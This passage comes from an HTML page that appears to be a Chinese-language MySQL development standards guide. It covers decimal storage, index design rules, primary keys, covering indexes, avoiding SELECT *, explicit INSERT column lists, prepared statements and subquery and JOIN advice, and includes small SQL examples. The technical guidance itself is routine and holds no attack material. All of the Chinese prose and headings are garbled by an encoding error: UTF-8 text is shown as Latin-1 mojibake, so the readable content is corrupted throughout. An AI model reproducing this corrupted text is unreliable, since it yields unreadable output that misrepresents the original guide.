ç±»å‹ä¸ºç²¾å‡†æµ®ç‚¹æ•°ï¼Œåœ¨<strong>è®¡ç®—æ—¶ä¸ä¼šä¸¢å¤±ç²¾åº¦</strong>ã€‚å ç”¨ç©ºé—´ç”±å®šä¹‰çš„å®½åº¦å†³å®šï¼Œæ¯ 4 ä¸ªå­—èŠ‚å¯ä»¥å­˜å‚¨ 9 ä½æ•°å­—ï¼Œå¹¶ä¸”å°æ•°ç‚¹è¦å ç”¨ä¸€ä¸ªå­—èŠ‚ã€‚</p><p>å¹¶ä¸”ï¼Œdecimal å¯ç”¨äºå­˜å‚¨æ¯” bigint æ›´å¤§çš„æ•´å‹æ•°æ®ä¸è¿‡ï¼Œ ç”±äº decimal éœ€è¦é¢å¤–çš„ç©ºé—´å’Œè®¡ç®—å¼€é”€ï¼Œåº”è¯¥å°½é‡åªåœ¨éœ€è¦å¯¹æ•°æ®è¿›è¡Œç²¾ç¡®è®¡ç®—æ—¶æ‰ä½¿ç”¨ decimal ã€‚</p><h4 id="å•è¡¨ä¸è¦åŒ…å«è¿‡å¤šå­—æ®µ"><a href="#å•è¡¨ä¸è¦åŒ…å«è¿‡å¤šå­—æ®µ" class="headerlink" title="å•è¡¨ä¸è¦åŒ…å«è¿‡å¤šå­—æ®µ"></a>å•è¡¨ä¸è¦åŒ…å«è¿‡å¤šå­—æ®µ</h4><h3 id="ç´¢å¼•è®¾è®¡è§„èŒƒ"><a href="#ç´¢å¼•è®¾è®¡è§„èŒƒ" class="headerlink" title="ç´¢å¼•è®¾è®¡è§„èŒƒ"></a>ç´¢å¼•è®¾è®¡è§„èŒƒ</h3><h4 id="é™åˆ¶æ¯å¼ è¡¨ä¸Šçš„ç´¢å¼•æ•°é‡-å»ºè®®å•å¼ è¡¨ç´¢å¼•ä¸è¶…è¿‡-5-ä¸ª"><a href="#é™åˆ¶æ¯å¼ è¡¨ä¸Šçš„ç´¢å¼•æ•°é‡-å»ºè®®å•å¼ è¡¨ç´¢å¼•ä¸è¶…è¿‡-5-ä¸ª" class="headerlink" title="é™åˆ¶æ¯å¼ è¡¨ä¸Šçš„ç´¢å¼•æ•°é‡,å»ºè®®å•å¼ è¡¨ç´¢å¼•ä¸è¶…è¿‡ 5 ä¸ª"></a>é™åˆ¶æ¯å¼ è¡¨ä¸Šçš„ç´¢å¼•æ•°é‡,å»ºè®®å•å¼ è¡¨ç´¢å¼•ä¸è¶…è¿‡ 5 ä¸ª</h4><p>ç´¢å¼•å¹¶ä¸æ˜¯è¶Šå¤šè¶Šå¥½ï¼ç´¢å¼•å¯ä»¥æé«˜æ•ˆç‡åŒæ ·å¯ä»¥é™ä½æ•ˆç‡ã€‚</p><p>ç´¢å¼•å¯ä»¥å¢åŠ æŸ¥è¯¢æ•ˆç‡ï¼Œä½†åŒæ ·ä¹Ÿä¼šé™ä½æ’å…¥å’Œæ›´æ–°çš„æ•ˆç‡ï¼Œç”šè‡³æœ‰äº›æƒ…å†µä¸‹ä¼šé™ä½æŸ¥è¯¢æ•ˆç‡ã€‚</p><p>å› ä¸º MySQL ä¼˜åŒ–å™¨åœ¨é€‰æ‹©å¦‚ä½•ä¼˜åŒ–æŸ¥è¯¢æ—¶ï¼Œä¼šæ ¹æ®ç»Ÿä¸€ä¿¡æ¯ï¼Œå¯¹æ¯ä¸€ä¸ªå¯ä»¥ç”¨åˆ°çš„ç´¢å¼•æ¥è¿›è¡Œè¯„ä¼°ï¼Œä»¥ç”Ÿæˆå‡ºä¸€ä¸ªæœ€å¥½çš„æ‰§è¡Œè®¡åˆ’ï¼Œå¦‚æœåŒæ—¶æœ‰å¾ˆå¤šä¸ªç´¢å¼•éƒ½å¯ä»¥ç”¨äºæŸ¥è¯¢ï¼Œå°±ä¼šå¢åŠ  MySQL ä¼˜åŒ–å™¨ç”Ÿæˆæ‰§è¡Œè®¡åˆ’çš„æ—¶é—´ï¼ŒåŒæ ·ä¼šé™ä½æŸ¥è¯¢æ€§èƒ½ã€‚</p><h4 id="ç¦æ­¢ä½¿ç”¨å…¨æ–‡ç´¢å¼•"><a href="#ç¦æ­¢ä½¿ç”¨å…¨æ–‡ç´¢å¼•" class="headerlink" title="ç¦æ­¢ä½¿ç”¨å…¨æ–‡ç´¢å¼•"></a>ç¦æ­¢ä½¿ç”¨å…¨æ–‡ç´¢å¼•</h4><p>å…¨æ–‡ç´¢å¼•ä¸é€‚ç”¨äº OLTP(è”æœºäº‹åŠ¡å¤„ç†) åœºæ™¯ã€‚</p><h4 id="ç¦æ­¢ç»™è¡¨ä¸­çš„æ¯ä¸€åˆ—éƒ½å»ºç«‹å•ç‹¬çš„ç´¢å¼•"><a href="#ç¦æ­¢ç»™è¡¨ä¸­çš„æ¯ä¸€åˆ—éƒ½å»ºç«‹å•ç‹¬çš„ç´¢å¼•" class="headerlink" title="ç¦æ­¢ç»™è¡¨ä¸­çš„æ¯ä¸€åˆ—éƒ½å»ºç«‹å•ç‹¬çš„ç´¢å¼•"></a>ç¦æ­¢ç»™è¡¨ä¸­çš„æ¯ä¸€åˆ—éƒ½å»ºç«‹å•ç‹¬çš„ç´¢å¼•</h4><p>5.6 ç‰ˆæœ¬ä¹‹å‰ï¼Œä¸€ä¸ª sql åªèƒ½ä½¿ç”¨åˆ°ä¸€ä¸ªè¡¨ä¸­çš„ä¸€ä¸ªç´¢å¼•ï¼Œ5.6 ä»¥åï¼Œè™½ç„¶æœ‰äº†åˆå¹¶ç´¢å¼•çš„ä¼˜åŒ–æ–¹å¼ï¼Œä½†æ˜¯è¿˜æ˜¯è¿œè¿œæ²¡æœ‰ä½¿ç”¨ä¸€ä¸ªè”åˆç´¢å¼•çš„æŸ¥è¯¢æ–¹å¼å¥½ã€‚</p><h4 id="æ¯ä¸ª-InnoDB-è¡¨å¿…é¡»æœ‰ä¸ªä¸»é”®"><a href="#æ¯ä¸ª-InnoDB-è¡¨å¿…é¡»æœ‰ä¸ªä¸»é”®" class="headerlink" title="æ¯ä¸ª InnoDB è¡¨å¿…é¡»æœ‰ä¸ªä¸»é”®"></a>æ¯ä¸ª InnoDB è¡¨å¿…é¡»æœ‰ä¸ªä¸»é”®</h4><p>InnoDB æ˜¯ä¸€ç§ç´¢å¼•ç»„ç»‡è¡¨ï¼šæ•°æ®çš„å­˜å‚¨çš„é€»è¾‘é¡ºåºå’Œç´¢å¼•çš„é¡ºåºæ˜¯ç›¸åŒçš„ã€‚æ¯ä¸ªè¡¨éƒ½å¯ä»¥æœ‰å¤šä¸ªç´¢å¼•ï¼Œä½†æ˜¯è¡¨çš„å­˜å‚¨é¡ºåºåªèƒ½æœ‰ä¸€ç§ã€‚</p><p>InnoDB æ˜¯æŒ‰ç…§ä¸»é”®ç´¢å¼•çš„é¡ºåºæ¥ç»„ç»‡è¡¨çš„:</p><ul><li>ä¸è¦ä½¿ç”¨æ›´æ–°é¢‘ç¹çš„åˆ—ä½œä¸ºä¸»é”®ï¼Œä¸ä½¿ç”¨å¤šåˆ—ä¸»é”®ï¼ˆç›¸å½“äºè”åˆç´¢å¼•ï¼‰</li><li>ä¸è¦ä½¿ç”¨ UUID,MD5,HASH,å­—ç¬¦ä¸²åˆ—ä½œä¸ºä¸»é”®ï¼ˆæ— æ³•ä¿è¯æ•°æ®çš„é¡ºåºå¢é•¿ï¼‰</li><li>ä¸»é”®å»ºè®®ä½¿ç”¨è‡ªå¢ ID å€¼</li></ul><h4 id="å¸¸è§ç´¢å¼•åˆ—å»ºè®®å¸¸è§ç´¢å¼•åˆ—å»ºè®®"><a href="#å¸¸è§ç´¢å¼•åˆ—å»ºè®®å¸¸è§ç´¢å¼•åˆ—å»ºè®®" class="headerlink" title="å¸¸è§ç´¢å¼•åˆ—å»ºè®®å¸¸è§ç´¢å¼•åˆ—å»ºè®®"></a>å¸¸è§ç´¢å¼•åˆ—å»ºè®®å¸¸è§ç´¢å¼•åˆ—å»ºè®®</h4><ul><li>å‡ºç°åœ¨ SELECTã€UPDATEã€DELETE è¯­å¥çš„ WHERE ä»å¥ä¸­çš„åˆ—</li><li>åŒ…å«åœ¨ ORDER BYã€GROUP BYã€DISTINCT ä¸­çš„å­—æ®µ</li><li>å¹¶ä¸è¦å°†ç¬¦åˆ 1 å’Œ 2 ä¸­çš„å­—æ®µçš„åˆ—éƒ½å»ºç«‹ä¸€ä¸ªç´¢å¼•ï¼Œ é€šå¸¸å°† 1ã€2 ä¸­çš„å­—æ®µå»ºç«‹è”åˆç´¢å¼•æ•ˆæœæ›´å¥½</li><li>å¤šè¡¨ join çš„å…³è”åˆ—</li></ul><h4 id="å¦‚ä½•é€‰æ‹©ç´¢å¼•åˆ—çš„é¡ºåº"><a href="#å¦‚ä½•é€‰æ‹©ç´¢å¼•åˆ—çš„é¡ºåº" class="headerlink" title="å¦‚ä½•é€‰æ‹©ç´¢å¼•åˆ—çš„é¡ºåº"></a>å¦‚ä½•é€‰æ‹©ç´¢å¼•åˆ—çš„é¡ºåº</h4><p>å»ºç«‹ç´¢å¼•çš„ç›®çš„æ˜¯ï¼šå¸Œæœ›é€šè¿‡ç´¢å¼•è¿›è¡Œæ•°æ®æŸ¥æ‰¾ï¼Œå‡å°‘éšæœº IOï¼Œå¢åŠ æŸ¥è¯¢æ€§èƒ½ ï¼Œç´¢å¼•èƒ½è¿‡æ»¤å‡ºè¶Šå°‘çš„æ•°æ®ï¼Œåˆ™ä»ç£ç›˜ä¸­è¯»å…¥çš„æ•°æ®ä¹Ÿå°±è¶Šå°‘ã€‚</p><ul><li>åŒºåˆ†åº¦æœ€é«˜çš„æ”¾åœ¨è”åˆç´¢å¼•çš„æœ€å·¦ä¾§ï¼ˆåŒºåˆ†åº¦=åˆ—ä¸­ä¸åŒå€¼çš„æ•°é‡/åˆ—çš„æ€»è¡Œæ•°ï¼‰</li><li>å°½é‡æŠŠå­—æ®µé•¿åº¦å°çš„åˆ—æ”¾åœ¨è”åˆç´¢å¼•çš„æœ€å·¦ä¾§ï¼ˆå› ä¸ºå­—æ®µé•¿åº¦è¶Šå°ï¼Œä¸€é¡µèƒ½å­˜å‚¨çš„æ•°æ®é‡è¶Šå¤§ï¼ŒIO æ€§èƒ½ä¹Ÿå°±è¶Šå¥½ï¼‰</li><li>ä½¿ç”¨æœ€é¢‘ç¹çš„åˆ—æ”¾åˆ°è”åˆç´¢å¼•çš„å·¦ä¾§ï¼ˆè¿™æ ·å¯ä»¥æ¯”è¾ƒå°‘çš„å»ºç«‹ä¸€äº›ç´¢å¼•ï¼‰</li></ul><h4 id="é¿å…å»ºç«‹å†—ä½™ç´¢å¼•å’Œé‡å¤ç´¢å¼•ï¼ˆå¢åŠ äº†æŸ¥è¯¢ä¼˜åŒ–å™¨ç”Ÿæˆæ‰§è¡Œè®¡åˆ’çš„æ—¶é—´ï¼‰"><a href="#é¿å…å»ºç«‹å†—ä½™ç´¢å¼•å’Œé‡å¤ç´¢å¼•ï¼ˆå¢åŠ äº†æŸ¥è¯¢ä¼˜åŒ–å™¨ç”Ÿæˆæ‰§è¡Œè®¡åˆ’çš„æ—¶é—´ï¼‰" class="headerlink" title="é¿å…å»ºç«‹å†—ä½™ç´¢å¼•å’Œé‡å¤ç´¢å¼•ï¼ˆå¢åŠ äº†æŸ¥è¯¢ä¼˜åŒ–å™¨ç”Ÿæˆæ‰§è¡Œè®¡åˆ’çš„æ—¶é—´ï¼‰"></a>é¿å…å»ºç«‹å†—ä½™ç´¢å¼•å’Œé‡å¤ç´¢å¼•ï¼ˆå¢åŠ äº†æŸ¥è¯¢ä¼˜åŒ–å™¨ç”Ÿæˆæ‰§è¡Œè®¡åˆ’çš„æ—¶é—´ï¼‰</h4><ul><li>é‡å¤ç´¢å¼•ç¤ºä¾‹ï¼šprimary key(id)ã€index(id)ã€unique index(id)</li><li>å†—ä½™ç´¢å¼•ç¤ºä¾‹ï¼šindex(a,b,c)ã€index(a,b)ã€index(a)</li></ul><h4 id="å¯¹äºé¢‘ç¹çš„æŸ¥è¯¢ä¼˜å…ˆè€ƒè™‘ä½¿ç”¨è¦†ç›–ç´¢å¼•"><a href="#å¯¹äºé¢‘ç¹çš„æŸ¥è¯¢ä¼˜å…ˆè€ƒè™‘ä½¿ç”¨è¦†ç›–ç´¢å¼•" class="headerlink" title="å¯¹äºé¢‘ç¹çš„æŸ¥è¯¢ä¼˜å…ˆè€ƒè™‘ä½¿ç”¨è¦†ç›–ç´¢å¼•"></a>å¯¹äºé¢‘ç¹çš„æŸ¥è¯¢ä¼˜å…ˆè€ƒè™‘ä½¿ç”¨è¦†ç›–ç´¢å¼•</h4><blockquote><p>è¦†ç›–ç´¢å¼•ï¼šå°±æ˜¯åŒ…å«äº†æ‰€æœ‰æŸ¥è¯¢å­—æ®µ (where,select,order by,group by åŒ…å«çš„å­—æ®µ) çš„ç´¢å¼•</p></blockquote><p>è¦†ç›–ç´¢å¼•çš„å¥½å¤„ï¼š</p><ul><li><strong>é¿å… InnoDB è¡¨è¿›è¡Œç´¢å¼•çš„äºŒæ¬¡æŸ¥è¯¢:</strong> InnoDB æ˜¯ä»¥èšé›†ç´¢å¼•çš„é¡ºåºæ¥å­˜å‚¨çš„ï¼Œå¯¹äº InnoDB æ¥è¯´ï¼ŒäºŒçº§ç´¢å¼•åœ¨å¶å­èŠ‚ç‚¹ä¸­æ‰€ä¿å­˜çš„æ˜¯è¡Œçš„ä¸»é”®ä¿¡æ¯ï¼Œå¦‚æœæ˜¯ç”¨äºŒçº§ç´¢å¼•æŸ¥è¯¢æ•°æ®çš„è¯ï¼Œåœ¨æŸ¥æ‰¾åˆ°ç›¸åº”çš„é”®å€¼åï¼Œè¿˜è¦é€šè¿‡ä¸»é”®è¿›è¡ŒäºŒæ¬¡æŸ¥è¯¢æ‰èƒ½è·å–æˆ‘ä»¬çœŸå®æ‰€éœ€è¦çš„æ•°æ®ã€‚è€Œåœ¨è¦†ç›–ç´¢å¼•ä¸­ï¼ŒäºŒçº§ç´¢å¼•çš„é”®å€¼ä¸­å¯ä»¥è·å–æ‰€æœ‰çš„æ•°æ®ï¼Œé¿å…äº†å¯¹ä¸»é”®çš„äºŒæ¬¡æŸ¥è¯¢ ï¼Œå‡å°‘äº† IO æ“ä½œï¼Œæå‡äº†æŸ¥è¯¢æ•ˆç‡ã€‚</li><li><strong>å¯ä»¥æŠŠéšæœº IO å˜æˆé¡ºåº IO åŠ å¿«æŸ¥è¯¢æ•ˆç‡:</strong> ç”±äºè¦†ç›–ç´¢å¼•æ˜¯æŒ‰é”®å€¼çš„é¡ºåºå­˜å‚¨çš„ï¼Œå¯¹äº IO å¯†é›†å‹çš„èŒƒå›´æŸ¥æ‰¾æ¥è¯´ï¼Œå¯¹æ¯”éšæœºä»ç£ç›˜è¯»å–æ¯ä¸€è¡Œçš„æ•°æ® IO è¦å°‘çš„å¤šï¼Œå› æ­¤åˆ©ç”¨è¦†ç›–ç´¢å¼•åœ¨è®¿é—®æ—¶ä¹Ÿå¯ä»¥æŠŠç£ç›˜çš„éšæœºè¯»å–çš„ IO è½¬å˜æˆç´¢å¼•æŸ¥æ‰¾çš„é¡ºåº IOã€‚</li></ul><h4 id="ç´¢å¼•-SET-è§„èŒƒ"><a href="#ç´¢å¼•-SET-è§„èŒƒ" class="headerlink" title="ç´¢å¼• SET è§„èŒƒ"></a>ç´¢å¼• SET è§„èŒƒ</h4><p>å°½é‡é¿å…ä½¿ç”¨å¤–é”®çº¦æŸ</p><ul><li>ä¸å»ºè®®ä½¿ç”¨å¤–é”®çº¦æŸï¼ˆforeign keyï¼‰ï¼Œä½†ä¸€å®šè¦åœ¨è¡¨ä¸è¡¨ä¹‹é—´çš„å…³è”é”®ä¸Šå»ºç«‹ç´¢å¼•</li><li>å¤–é”®å¯ç”¨äºä¿è¯æ•°æ®çš„å‚ç…§å®Œæ•´æ€§ï¼Œä½†å»ºè®®åœ¨ä¸šåŠ¡ç«¯å®ç°</li><li>å¤–é”®ä¼šå½±å“çˆ¶è¡¨å’Œå­è¡¨çš„å†™æ“ä½œä»è€Œé™ä½æ€§èƒ½</li></ul><h3 id="æ•°æ®åº“-SQL-å¼€å‘è§„èŒƒ"><a href="#æ•°æ®åº“-SQL-å¼€å‘è§„èŒƒ" class="headerlink" title="æ•°æ®åº“ SQL å¼€å‘è§„èŒƒ"></a>æ•°æ®åº“ SQL å¼€å‘è§„èŒƒ</h3><h4 id="å°½é‡ä¸åœ¨æ•°æ®åº“åšè¿ç®—ï¼Œå¤æ‚è¿ç®—éœ€ç§»åˆ°ä¸šåŠ¡åº”ç”¨é‡Œå®Œæˆ"><a href="#å°½é‡ä¸åœ¨æ•°æ®åº“åšè¿ç®—ï¼Œå¤æ‚è¿ç®—éœ€ç§»åˆ°ä¸šåŠ¡åº”ç”¨é‡Œå®Œæˆ" class="headerlink" title="å°½é‡ä¸åœ¨æ•°æ®åº“åšè¿ç®—ï¼Œå¤æ‚è¿ç®—éœ€ç§»åˆ°ä¸šåŠ¡åº”ç”¨é‡Œå®Œæˆ"></a>å°½é‡ä¸åœ¨æ•°æ®åº“åšè¿ç®—ï¼Œå¤æ‚è¿ç®—éœ€ç§»åˆ°ä¸šåŠ¡åº”ç”¨é‡Œå®Œæˆ</h4><h4 id="ä¼˜åŒ–å¯¹æ€§èƒ½å½±å“è¾ƒå¤§çš„-SQL-è¯­å¥"><a href="#ä¼˜åŒ–å¯¹æ€§èƒ½å½±å“è¾ƒå¤§çš„-SQL-è¯­å¥" class="headerlink" title="ä¼˜åŒ–å¯¹æ€§èƒ½å½±å“è¾ƒå¤§çš„ SQL è¯­å¥"></a>ä¼˜åŒ–å¯¹æ€§èƒ½å½±å“è¾ƒå¤§çš„ SQL è¯­å¥</h4><h4 id="å……åˆ†åˆ©ç”¨è¡¨ä¸Šå·²ç»å­˜åœ¨çš„ç´¢å¼•"><a href="#å……åˆ†åˆ©ç”¨è¡¨ä¸Šå·²ç»å­˜åœ¨çš„ç´¢å¼•" class="headerlink" title="å……åˆ†åˆ©ç”¨è¡¨ä¸Šå·²ç»å­˜åœ¨çš„ç´¢å¼•"></a>å……åˆ†åˆ©ç”¨è¡¨ä¸Šå·²ç»å­˜åœ¨çš„ç´¢å¼•</h4><p>é¿å…ä½¿ç”¨åŒ%å·çš„æŸ¥è¯¢æ¡ä»¶ã€‚å¦‚ï¼š<code>a like &#39;%123%&#39;</code>ï¼Œï¼ˆå¦‚æœæ— å‰ç½®%,åªæœ‰åç½®%ï¼Œæ˜¯å¯ä»¥ç”¨åˆ°åˆ—ä¸Šçš„ç´¢å¼•çš„ï¼‰</p><p>ä¸€ä¸ª SQL åªèƒ½åˆ©ç”¨åˆ°å¤åˆç´¢å¼•ä¸­çš„ä¸€åˆ—è¿›è¡ŒèŒƒå›´æŸ¥è¯¢ã€‚å¦‚ï¼šæœ‰ a,b,c åˆ—çš„è”åˆç´¢å¼•ï¼Œåœ¨æŸ¥è¯¢æ¡ä»¶ä¸­æœ‰ a åˆ—çš„èŒƒå›´æŸ¥è¯¢ï¼Œåˆ™åœ¨ b,c åˆ—ä¸Šçš„ç´¢å¼•å°†ä¸ä¼šè¢«ç”¨åˆ°ã€‚</p><p>åœ¨å®šä¹‰è”åˆç´¢å¼•æ—¶ï¼Œå¦‚æœ a åˆ—è¦ç”¨åˆ°èŒƒå›´æŸ¥æ‰¾çš„è¯ï¼Œå°±è¦æŠŠ a åˆ—æ”¾åˆ°è”åˆç´¢å¼•çš„å³ä¾§ï¼Œä½¿ç”¨ left join æˆ– not exists æ¥ä¼˜åŒ– not in æ“ä½œï¼Œå› ä¸º not in ä¹Ÿé€šå¸¸ä¼šä½¿ç”¨ç´¢å¼•å¤±æ•ˆã€‚</p><h4 id="ç¦æ­¢ä½¿ç”¨-SELECT-å¿…é¡»ä½¿ç”¨-SELECT-lt-å­—æ®µåˆ—è¡¨-gt-æŸ¥è¯¢"><a href="#ç¦æ­¢ä½¿ç”¨-SELECT-å¿…é¡»ä½¿ç”¨-SELECT-lt-å­—æ®µåˆ—è¡¨-gt-æŸ¥è¯¢" class="headerlink" title="ç¦æ­¢ä½¿ç”¨ SELECT * å¿…é¡»ä½¿ç”¨ SELECT &lt;å­—æ®µåˆ—è¡¨&gt; æŸ¥è¯¢"></a>ç¦æ­¢ä½¿ç”¨ SELECT * å¿…é¡»ä½¿ç”¨ SELECT &lt;å­—æ®µåˆ—è¡¨&gt; æŸ¥è¯¢</h4><p><code>SELECT *</code> ä¼šæ¶ˆè€—æ›´å¤šçš„ CPUã€‚<br><code>SELECT *</code> æ— ç”¨å­—æ®µå¢åŠ ç½‘ç»œå¸¦å®½èµ„æºæ¶ˆè€—ï¼Œå¢åŠ æ•°æ®ä¼ è¾“æ—¶é—´ï¼Œå°¤å…¶æ˜¯å¤§å­—æ®µï¼ˆå¦‚ varcharã€blobã€textï¼‰ã€‚<br><code>SELECT *</code> æ— æ³•ä½¿ç”¨ MySQL ä¼˜åŒ–å™¨è¦†ç›–ç´¢å¼•çš„ä¼˜åŒ–ï¼ˆåŸºäº MySQL ä¼˜åŒ–å™¨çš„â€œè¦†ç›–ç´¢å¼•â€ç­–ç•¥åˆæ˜¯é€Ÿåº¦æå¿«ï¼Œæ•ˆç‡æé«˜ï¼Œä¸šç•Œæä¸ºæ¨èçš„æŸ¥è¯¢ä¼˜åŒ–æ–¹å¼ï¼‰<br><code>SELECT &lt;å­—æ®µåˆ—è¡¨&gt;</code> å¯å‡å°‘è¡¨ç»“æ„å˜æ›´å¸¦æ¥çš„å½±å“</p><h4 id="ç¦æ­¢ä½¿ç”¨ä¸å«å­—æ®µåˆ—è¡¨çš„-INSERT-è¯­å¥"><a href="#ç¦æ­¢ä½¿ç”¨ä¸å«å­—æ®µåˆ—è¡¨çš„-INSERT-è¯­å¥" class="headerlink" title="ç¦æ­¢ä½¿ç”¨ä¸å«å­—æ®µåˆ—è¡¨çš„ INSERT è¯­å¥"></a>ç¦æ­¢ä½¿ç”¨ä¸å«å­—æ®µåˆ—è¡¨çš„ INSERT è¯­å¥</h4><p>å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t <span class="keyword">values</span> (<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);</span><br></pre></td></tr></table></figure><p>åº”ä½¿ç”¨ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t(c1,c2,c3) <span class="keyword">values</span> (<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="å»ºè®®ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥è¿›è¡Œæ•°æ®åº“æ“ä½œ"><a href="#å»ºè®®ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥è¿›è¡Œæ•°æ®åº“æ“ä½œ" class="headerlink" title="å»ºè®®ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥è¿›è¡Œæ•°æ®åº“æ“ä½œ"></a>å»ºè®®ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥è¿›è¡Œæ•°æ®åº“æ“ä½œ</h4><ul><li>é¢„ç¼–è¯‘è¯­å¥å¯ä»¥é‡å¤ä½¿ç”¨è¿™äº›è®¡åˆ’ï¼Œå‡å°‘ SQL ç¼–è¯‘æ‰€éœ€è¦çš„æ—¶é—´ï¼Œè¿˜å¯ä»¥è§£å†³åŠ¨æ€ SQL æ‰€å¸¦æ¥çš„ SQL æ³¨å…¥çš„é—®é¢˜ã€‚</li><li>åªä¼ å‚æ•°ï¼Œæ¯”ä¼ é€’ SQL è¯­å¥æ›´é«˜æ•ˆã€‚</li><li>ç›¸åŒè¯­å¥å¯ä»¥ä¸€æ¬¡è§£æï¼Œå¤šæ¬¡ä½¿ç”¨ï¼Œæé«˜å¤„ç†æ•ˆç‡ã€‚</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">prepare</span> ins <span class="keyword">from</span> <span class="string">&#x27;insert into t select ?,?&#x27;</span>;  #é¢„ç¼–è¯‘</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="number">999</span>,<span class="variable">@b</span><span class="operator">=</span><span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="keyword">execute</span> ins <span class="keyword">using</span> <span class="variable">@a</span>,<span class="variable">@b</span>; #ä¼ å‚ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥</span><br></pre></td></tr></table></figure><h4 id="é¿å…æ•°æ®ç±»å‹çš„éšå¼è½¬æ¢"><a href="#é¿å…æ•°æ®ç±»å‹çš„éšå¼è½¬æ¢" class="headerlink" title="é¿å…æ•°æ®ç±»å‹çš„éšå¼è½¬æ¢"></a>é¿å…æ•°æ®ç±»å‹çš„éšå¼è½¬æ¢</h4><h4 id="é¿å…ä½¿ç”¨å­æŸ¥è¯¢ï¼Œå¯ä»¥æŠŠå­æŸ¥è¯¢ä¼˜åŒ–ä¸º-join-æ“ä½œ"><a href="#é¿å…ä½¿ç”¨å­æŸ¥è¯¢ï¼Œå¯ä»¥æŠŠå­æŸ¥è¯¢ä¼˜åŒ–ä¸º-join-æ“ä½œ" class="headerlink" title="é¿å…ä½¿ç”¨å­æŸ¥è¯¢ï¼Œå¯ä»¥æŠŠå­æŸ¥è¯¢ä¼˜åŒ–ä¸º join æ“ä½œ"></a>é¿å…ä½¿ç”¨å­æŸ¥è¯¢ï¼Œå¯ä»¥æŠŠå­æŸ¥è¯¢ä¼˜åŒ–ä¸º join æ“ä½œ</h4><p>é€šå¸¸å­æŸ¥è¯¢åœ¨ in å­å¥ä¸­ï¼Œä¸”å­æŸ¥è¯¢ä¸­ä¸ºç®€å• SQL(ä¸åŒ…å« unionã€group byã€order byã€limit ä»å¥) æ—¶,æ‰å¯ä»¥æŠŠå­æŸ¥è¯¢è½¬åŒ–ä¸ºå…³è”æŸ¥è¯¢è¿›è¡Œä¼˜åŒ–ã€‚</p><p><strong>å­æŸ¥è¯¢æ€§èƒ½å·®çš„åŸå› ï¼š</strong> å­æŸ¥è¯¢çš„ç»“æœé›†æ— æ³•ä½¿ç”¨ç´¢å¼•ï¼Œé€šå¸¸å­æŸ¥è¯¢çš„ç»“æœé›†ä¼šè¢«å­˜å‚¨åˆ°ä¸´æ—¶è¡¨ä¸­ï¼Œä¸è®ºæ˜¯å†…å­˜ä¸´æ—¶è¡¨è¿˜æ˜¯ç£ç›˜ä¸´æ—¶è¡¨éƒ½ä¸ä¼šå­˜åœ¨ç´¢å¼•ï¼Œæ‰€ä»¥æŸ¥è¯¢æ€§èƒ½ä¼šå—åˆ°ä¸€å®šçš„å½±å“ã€‚ç‰¹åˆ«æ˜¯å¯¹äºè¿”å›ç»“æœé›†æ¯”è¾ƒå¤§çš„å­æŸ¥è¯¢ï¼Œå…¶å¯¹æŸ¥è¯¢æ€§èƒ½çš„å½±å“ä¹Ÿå°±è¶Šå¤§ã€‚ç”±äºå­æŸ¥è¯¢ä¼šäº§ç”Ÿå¤§é‡çš„ä¸´æ—¶è¡¨ä¹Ÿæ²¡æœ‰ç´¢å¼•ï¼Œæ‰€ä»¥ä¼šæ¶ˆè€—è¿‡å¤šçš„ CPU å’Œ IO èµ„æºï¼Œäº§ç”Ÿå¤§é‡çš„æ…¢æŸ¥è¯¢ã€‚</p><h4 id="é¿å…ä½¿ç”¨-JOIN-å…³è”å¤ªå¤šçš„è¡¨"><a href="#é¿å…ä½¿ç”¨-JOIN-å…³è”å¤ªå¤šçš„è¡¨" class="headerlink" title="é¿å…ä½¿ç”¨ JOIN å…³è”å¤ªå¤šçš„è¡¨"></a>é¿å…ä½¿ç”¨ JOIN å…³è”å¤ªå¤šçš„è¡¨</h4><p>ä¼šå ç”¨å¤§é‡å†…å­˜,æœ‰å¯èƒ½å‡ºç°å†…å­˜æº¢å‡º</p><h4 id="å‡å°‘åŒæ•°æ®åº“çš„äº¤äº’æ¬¡æ•°"><a href="#å‡å°‘åŒæ•°æ®åº“çš„äº¤äº’æ¬¡æ•°" class="headerlink" title="å‡å°‘åŒæ•°æ®åº“çš„äº¤äº’æ¬¡æ•°"></a>å‡å°‘åŒæ•°æ®åº“çš„äº¤äº’æ¬¡æ•°</h4><p>æ•°æ®åº“æ›´é€‚åˆå¤„ç†æ‰¹é‡æ“ä½œï¼Œåˆå¹¶å¤šä¸ªç›¸åŒçš„æ“ä½œåˆ°ä¸€èµ·ï¼Œå¯ä»¥æé«˜å¤„ç†æ•ˆç‡ã€‚</p><h4 id="å¯¹åº”åŒä¸€åˆ—è¿›è¡Œ-or-åˆ¤æ–­æ—¶ï¼Œä½¿ç”¨-in-ä»£æ›¿-or"><a href="#å¯¹åº”åŒä¸€åˆ—è¿›è¡Œ-or-åˆ¤æ–­æ—¶ï¼Œä½¿ç”¨-in-ä»£æ›¿-or" class="headerlink" title="å¯¹åº”åŒä¸€åˆ—è¿›è¡Œ or åˆ¤æ–­æ—¶ï¼Œä½¿ç”¨ in ä»£æ›¿ or"></a>å¯¹åº”åŒä¸€åˆ—è¿›è¡Œ or åˆ¤æ–­æ—¶ï¼Œä½¿ç”¨ in ä»£æ›¿ or</h4><p>in çš„å€¼ä¸è¦è¶…è¿‡ 500 ä¸ªï¼Œin æ“ä½œå¯ä»¥æ›´æœ‰æ•ˆçš„åˆ©ç”¨ç´¢å¼•ï¼Œor 